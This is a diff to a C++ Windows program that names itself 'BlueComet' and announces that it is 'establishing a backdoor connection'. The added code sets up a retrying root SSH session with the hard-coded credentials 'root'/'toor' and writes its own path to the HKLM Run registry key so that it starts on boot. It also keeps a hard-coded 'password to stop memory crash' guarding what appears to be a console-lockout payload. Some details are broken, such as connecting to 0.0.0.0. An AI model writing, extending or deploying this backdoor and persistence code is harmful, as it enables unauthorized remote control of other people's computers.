@@ -11,65 +11,181 @@
 
 
 #include <iostream>
-#include <string>	
+#include <string>
+#include <fstream>
 #include <cstring>
 #include <libssh/libssh.h>
-#include <cstring>
+#include <windows.h>
 #include <cstdlib>
-#include <Windows.h>
-#pragma comment(lib, "Advapi32.lib")
-
+#include <cstdio>
+#include <io.h>
 
 using namespace std;
 
-int main()
-{
-	
-	/*set up remote connection for all hosts*/
-	
-    const char* host = "0.0.0.0"; // allow connections from any network
-    int port = 2345;
-
+ssh_session ssh_connect_to_server(const char* host, int port, const char* username, const char* password) {
     ssh_session session = ssh_new();
     if (session == NULL) {
         cerr << "Error creating SSH session" << endl;
-        return 1;
+        return NULL;
     }
 
     ssh_options_set(session, SSH_OPTIONS_HOST, host);
     ssh_options_set(session, SSH_OPTIONS_PORT, &port);
-    ssh_options_set(session, SSH_OPTIONS_USER, "root"); // replace with your admin username
-    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc"); 
+    ssh_options_set(session, SSH_OPTIONS_USER, username);
+    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc");
 
     int rc = ssh_connect(session);
-    if (rc != SSH_OK) {
+    while (rc != SSH_OK) {
         cerr << "Error connecting to SSH server: " << ssh_get_error(session) << endl;
+        ssh_disconnect(session);
         ssh_free(session);
-        return 1;
+
+        // Try to reconnect after 5 seconds
+        SleepEx(5000, FALSE);
+
+        session = ssh_new();
+        if (session == NULL) {
+            cerr << "Error creating SSH session" << endl;
+            return NULL;
+        }
+
+        ssh_options_set(session, SSH_OPTIONS_HOST, host);
+        ssh_options_set(session, SSH_OPTIONS_PORT, &port);
+        ssh_options_set(session, SSH_OPTIONS_USER, username);
+        ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc");
+
+        rc = ssh_connect(session);
     }
 
-    rc = ssh_userauth_password(session, NULL, "toor"); // replace with your admin password
+    rc = ssh_userauth_password(session, NULL, password);
     if (rc != SSH_AUTH_SUCCESS) {
         cerr << "Error authenticating with SSH server: " << ssh_get_error(session) << endl;
         ssh_disconnect(session);
         ssh_free(session);
+        return NULL;
+    }
+
+    return session;
+}
+
+/*VCPKG function*/
+
+void installVcpkg() {
+    const std::string vcpkgUrl = "https://github.com/microsoft/vcpkg/archive/refs/tags/2022.02.zip";
+    const std::string vcpkgZip = "vcpkg.zip";
+    const std::string vcpkgDir = "vcpkg-2022.02";
+
+    std::cout << "Checking if vcpkg is already installed..." << std::endl;
+
+    // Check if vcpkg directory already exists
+    if (_access(vcpkgDir.c_str(), 0) == 0) {
+        std::cout << "vcpkg is already installed. Exiting." << std::endl;
+        return;
+    }
+
+    std::cout << "Downloading vcpkg..." << std::endl;
+
+    // Download vcpkg zip file
+    std::system(("powershell -Command \"Invoke-WebRequest -Uri "
+                 + vcpkgUrl + " -OutFile " + vcpkgZip + "\"").c_str());
+
+    // Unzip vcpkg
+    std::system(("powershell -Command \"Expand-Archive -Path .\\"
+                 + vcpkgZip + " -DestinationPath .\"").c_str());
+
+    // Change directory to vcpkg
+    std::system(("cd " + vcpkgDir).c_str());
+
+    // Bootstrap vcpkg
+    std::system(".\\bootstrap-vcpkg.bat");
+
+    std::cout << "vcpkg installation complete." << std::endl;
+}
+
+/*Install LibSSH*/
+
+int installLibssh() {
+    std::cout << "BlueComet is establishing a backdoor connection." << std::endl;
+
+    // Check if libssh is already installed
+    int result = std::system("vcpkg list libssh --x-install-root | findstr /C:\"libssh\" > nul");
+    if (result == 0) {
+        std::cout << "libssh is already installed. Exiting." << std::endl;
+        return 0;
+    }
+
+    std::cout << "Installing..." << std::endl;
+
+    // Install libssh
+    result = std::system("vcpkg install libssh");
+
+    std::cout << "BlueComet is ready for remote connection." << std::endl;
+
+    return result;
+}
+
+
+int main() {
+
+
+/* Check if VCPKG is installed, if not install*/
+
+    installVcpkg();
+
+
+/*Install Libssh*/
+
+
+    std::cout << "BlueComet is persistent." << std::endl;
+
+    // Install libssh if not already installed
+    int result = installLibssh();
+
+    if (result == 0) {
+        std::cout << "libssh installation successful." << std::endl;
+    } else {
+        std::cout << "libssh installation failed." << std::endl;
+    }
+
+ 
+/*set up remote connection for all hosts*/
+
+{
+
+    ssh_session session = ssh_connect_to_server("0.0.0.0", 2345, "root", "toor");
+    if (session == NULL) {
         return 1;
     }
 
-/* Create registry to include BlueComet in startup on all local machines */
-	
+
+    /* Create registry to include BlueComet in startup on all local machines */
+
     char re[MAX_PATH];
     string FP = string(re, GetModuleFileName(NULL, re, MAX_PATH));
 
-    LONG ln = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "BlueComet", RRF_RT_REG_SZ, 0, 0, 0);
+    HKEY hKey;
+    LONG ln = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
+    if (ln != ERROR_SUCCESS) {
+        cerr << "Error opening registry key" << endl;
+        return 1;
+    }
+
+    ln = RegSetValueEx(hKey, "BlueComet", 0, REG_SZ, (const BYTE*)FP.c_str(), (DWORD)FP.size() + 1);
+    if (ln != ERROR_SUCCESS) {
+        cerr << "Error setting registry value" << endl;
+        RegCloseKey(hKey);
+        return 1;
+    }
+
+    RegCloseKey(hKey);
 
     /* Password to stop memory crash is P@thf1nder */
-    const char password[] = {'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0'};
+    const char password[] = { 'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0' };
     char input[11];
     bool stopProgram = false;
     int loopCount = 0;
-	
-	   /* Set console to full screen mode */
+
+    /* Set console to full screen mode */
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(hConsole, &csbi);
@@ -96,3 +212,4 @@ int main()
     }
     return 0;
 }
+   
